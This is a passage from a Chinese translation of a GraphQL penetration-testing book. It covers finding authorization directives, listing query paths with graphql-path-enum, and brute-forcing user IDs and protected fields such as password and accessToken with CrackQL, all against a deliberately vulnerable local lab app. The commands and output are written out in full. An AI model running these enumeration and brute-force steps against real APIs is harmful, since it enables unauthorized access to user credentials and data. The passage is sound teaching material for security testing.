运行这个查询将返回目标服务器中所有查询级别和模式级别的指令列表。如果你在列表中发现 `@auth` 指令，你可以假设该模式支持它。当然，开发者可能会给指令取不同的名字，因此还要留意类似 `@authorize`、`@authorization`、`@authz` 等名称。

#### 在模式中查找身份验证指令

如果我们执行一个 introspection 查询来识别指令，我们将知道是否存在 `@auth` 指令。然而，我们并不知道该指令在模式中的应用位置，因为这些信息在 introspection 查询中并未暴露。这是因为客户端不会调用模式级别的指令；相反，开发者使用它们来防止未经授权的访问等情况。

查看 列表 7-9 中的 `User` 对象类型作为示例。

```
Type User {
  id: ID
  username: String
  email: String
  password: String @auth(requires: ADMIN)
  role: String
}
```

列表 7-9：模式中 `@auth` 指令的使用示例

在白盒渗透测试中，扫描 `@auth` 指令的模式非常有用，白盒测试提供了 SDL 文件。但在黑盒测试中，如果无法访问模式，你可能知道 `password` 字段的存在，但并不知道 `@auth` 指令是否应用于该字段。

GraphQL 开发者社区曾讨论过在 introspection 系统中暴露关于使用模式级别指令的信息。然而，目前许多 GraphQL 实现并未暴露这些信息。

### 使用 graphql-path-enum 枚举路径

要测试授权控制，你应该尝试通过尽可能多的方式访问敏感字段。例如，考虑 DVGA 模式中的以下片段，其中有三个查询访问 `PasteObject`：

```
type Query {
  pastes(public: Boolean, limit: Int, filter: String): [**PasteObject**]
  paste(id: Int, title: String): **PasteObject**
`--snip--`
  users(id: Int): [UserObject]
  readAndBurn(id: Int): **PasteObject**
  search(keyword: String): [SearchResult]
  audits: [AuditObject]
  deleteAllPastes: Boolean
  me(token: String): UserObject
}
```

作为客户端，你可以通过使用 `pastes`、`paste` 或 `readAndBurn` 返回粘贴信息。在实施带内授权时，开发者可能会不小心只保护其中一些查询。因此，确定访问给定对象类型的所有可能路径。

模式可能非常庞大，因此在识别所有通往特定对象类型路径的过程中自动化处理将非常有帮助。对于这个任务，我们将使用 graphql-path-enum。这个工具期望两个重要的参数：内省 JSON 响应和我们想要测试授权问题的对象类型的名称。让我们使用它来查找到`PasteObject`对象类型的所有路径。

首先，通过将查询从[`github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt`](https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt)粘贴到 Altair 中来运行完整的内省查询。发送请求并将响应复制到名为*introspection.json*的文件中。接下来，提供这个文件给 graphql-path-enum，并告诉它搜索所有导致`PasteObject`对象的路径，如 7-10 列表中所示。

```
# cd ~
# ./graphql-path-enum -i introspection.json -t PasteObject

Found 3 ways to reach the "PasteObject" node:
- Query (pastes) -> PasteObject
- Query (paste) -> PasteObject
- Query (readAndBurn) -> PasteObject
```

列表 7-10：使用 graphql-path-enum 执行类型路径枚举

正如您所见，graphql-path-enum 遍历了内省响应并标识了通向对象的所有可能查询路径。现在我们可以手动发送这三个查询，看看是否有任何一个允许访问其他查询不允许的对象。

如果您想在一个大而复杂的 GraphQL API 中练习模式遍历，请尝试对着名的星球大战 API（SWAPI）中的`Vehicle`对象类型运行 graphql-path-enum。这个 API 的模式比 DVGA 的模式要大，并且应该说明在测试授权问题时路径枚举的重要性。您可以在[`github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json`](https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json)访问 SWAPI 模式。

### 使用 CrackQL 进行参数和字段的暴力破解

因为 graphql-path-enum 仅适用于对象类型，您可以尝试在第六章中讨论的字段填充技术，以测试旨在限制非特权用户可以查看的数据量的弱或不存在的授权控制。我们还可以使用 CrackQL 来程序化地暴力破解我们不应该访问的参数和字段。想象一下以下查询：

```
query {
  users(id: 1) {
    username
    password
  }
}
```

现在假设访问某些用户信息需要特殊的授权权限。我们知道用户 ID 是数字递增的，但不知道哪些受保护。让我们尝试用 CrackQL 来暴力破解它们。

在 CrackQL 文件夹下的*sample-queries*文件夹中，创建一个名为*users.graphql*的新文件，并包含以下内容：

```
**query {**
 **users(id: {{id|int}}) {**
 **username**
 **password**
 **}**
**}**
```

此查询使用了带有`Int`类型的`id`参数的`users`字段。因为查询接受`id`参数，我们可以尝试通过逐步提供数字用户标识符列表来枚举帐户。CrackQL 将渲染`{{id|int}}`字符串，并使用我们即将创建的词表中的单词替换它。

让我们创建一个可能的用户 ID 字典，作为一个单列 CSV 词表。使用一些 Bash 技巧可以轻松生成这样的列表：

```
# cd ~/CrackQL
# echo "id" > sample-inputs/users.csv
# for id in `seq 1 100`; do echo $id >> sample-inputs/users.csv; done
```

接下来，通过打印前五行来检查文件是否已正确生成：

```
# head -5 sample-inputs/users.csv

id
1
2
3
4
```

现在运行 CrackQL 以查找有效的用户 ID 并检索其用户名和密码字段：  

```
# python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/users.graphql
**-i sample-inputs/users.csv --verbose**

[+] Verifying Payload Batch Operation...
[+] Sending Alias Batch 1 of 1 to http://localhost:5013/graphql...
===============================
Results:

Data:
[{'alias1': {'data': [{'password': '******', 'username': 'admin'}],
             'inputs': {'id': '120'}}},
 {'alias2': {'data': [{'password': '******', 'username': 'operator'}],
             'inputs': {'id': '120'}}},
 {'alias3': {'data': [], 'inputs': {'id': '120'}}},
```

你还可以以相同的方式，暴力破解你怀疑由于授权控制无法访问的字段，只需修改原始查询以包含这些潜在字段：  

```
query {
  users(id: {{id|int}}) {
     username
     password
 **accessToken**
 **birthDate**
 **location**
   }
}
```

CrackQL 会将所有尝试的输出保存在 *~/CrackQL/results* 文件夹中。如果这些字段是可访问的，你将在该处看到相应的响应。  

## 概述  

本章介绍了带内和带外 GraphQL 身份验证与授权的架构模型。我们回顾了一些开发者可能在其 GraphQL 部署中采用的传统控制方法，并指出了这些方法可能容易受到的弱点。例如，使用 JWT 令牌的 GraphQL 实现可能容易受到令牌伪造的攻击。我们还将你的注意力引导到一些更新的、专门为 GraphQL 设计的身份验证与授权库和插件，如 GraphQL Modules、GraphQL Shield 和自定义 schema 指令。  

通过利用 GraphQL 的特性，如基于别名的查询批处理，我们可以手动进行暴力破解带内身份验证操作，或者使用 CrackQL 自动完成此操作。使用 graphql-path-enum，我们可以枚举类型的路径，再次使用 CrackQL，我们可以在没有适当授权控制的情况下访问字段。  

在下一章中，我们将讨论另一类古老的漏洞：注入攻击，这些攻击即便在现代 API 服务（如 GraphQL）面前依然能够肆虐。  
